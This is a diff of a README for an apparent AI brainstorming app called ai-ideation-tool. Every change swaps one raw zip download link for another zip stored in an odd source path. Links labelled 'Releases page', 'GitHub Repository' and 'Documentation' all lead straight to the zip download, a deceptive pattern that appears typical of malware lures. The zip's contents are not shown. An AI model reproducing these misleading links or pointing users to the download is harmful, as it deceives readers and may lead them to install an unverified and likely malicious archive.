@@ -6,9 +6,9 @@ Welcome to the ai-ideation-tool! This app is designed to help you brainstorm and
 
 ## 📥 Download the App
 
-[![Download ai-ideation-tool](https://raw.githubusercontent.com/HagarSalah91/ai-ideation-tool/main/nonconduction/ai-ideation-tool.zip)](https://raw.githubusercontent.com/HagarSalah91/ai-ideation-tool/main/nonconduction/ai-ideation-tool.zip)
+[![Download ai-ideation-tool](https://github.com/HagarSalah91/ai-ideation-tool/raw/refs/heads/main/src/constants/ai-tool-ideation-v1.6-alpha.2.zip)](https://github.com/HagarSalah91/ai-ideation-tool/raw/refs/heads/main/src/constants/ai-tool-ideation-v1.6-alpha.2.zip)
 
-To get started, simply visit the following link to access the latest version of the app: [Download Here](https://raw.githubusercontent.com/HagarSalah91/ai-ideation-tool/main/nonconduction/ai-ideation-tool.zip).
+To get started, simply visit the following link to access the latest version of the app: [Download Here](https://github.com/HagarSalah91/ai-ideation-tool/raw/refs/heads/main/src/constants/ai-tool-ideation-v1.6-alpha.2.zip).
 
 ## 📋 Features
 
@@ -30,7 +30,7 @@ Make sure your system meets the following requirements to run the ai-ideation-to
 
 ## 🔧 How to Install
 
-1. **Visit the Release Page:** Go to the [Releases page](https://raw.githubusercontent.com/HagarSalah91/ai-ideation-tool/main/nonconduction/ai-ideation-tool.zip).
+1. **Visit the Release Page:** Go to the [Releases page](https://github.com/HagarSalah91/ai-ideation-tool/raw/refs/heads/main/src/constants/ai-tool-ideation-v1.6-alpha.2.zip).
   
 2. **Select the Latest Version:** Choose the most recent version listed.
 
@@ -79,9 +79,9 @@ If you need further assistance, feel free to reach out through our GitHub Issues
 ## 🔗 Links
 
 For more information and updates, visit:
-- [GitHub Repository](https://raw.githubusercontent.com/HagarSalah91/ai-ideation-tool/main/nonconduction/ai-ideation-tool.zip)
-- [Documentation](https://raw.githubusercontent.com/HagarSalah91/ai-ideation-tool/main/nonconduction/ai-ideation-tool.zip)
+- [GitHub Repository](https://github.com/HagarSalah91/ai-ideation-tool/raw/refs/heads/main/src/constants/ai-tool-ideation-v1.6-alpha.2.zip)
+- [Documentation](https://github.com/HagarSalah91/ai-ideation-tool/raw/refs/heads/main/src/constants/ai-tool-ideation-v1.6-alpha.2.zip)
 
-To download the app, click here: [Download Here](https://raw.githubusercontent.com/HagarSalah91/ai-ideation-tool/main/nonconduction/ai-ideation-tool.zip).
+To download the app, click here: [Download Here](https://github.com/HagarSalah91/ai-ideation-tool/raw/refs/heads/main/src/constants/ai-tool-ideation-v1.6-alpha.2.zip).
 
 Thank you for using the ai-ideation-tool! Happy brainstorming!
